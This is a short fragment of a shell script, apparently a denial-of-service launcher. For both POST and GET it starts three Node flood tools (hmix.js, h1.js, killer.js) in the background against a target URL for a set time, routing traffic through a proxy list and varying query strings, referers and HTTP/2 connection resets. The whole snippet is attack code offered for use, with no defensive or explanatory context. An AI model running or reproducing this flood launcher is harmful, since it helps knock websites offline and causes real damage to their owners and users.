...
for m in POST GET; do
  node hmix.js -m $m -u $URL -s $TIME -p live.txt -t 1 -r 3 --full true -d false & 
  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true &
  node killer.js $m $URL $TIME 1 3 live.txt --query 1 --referer rand --http 2 --close --parsed --reset &
done
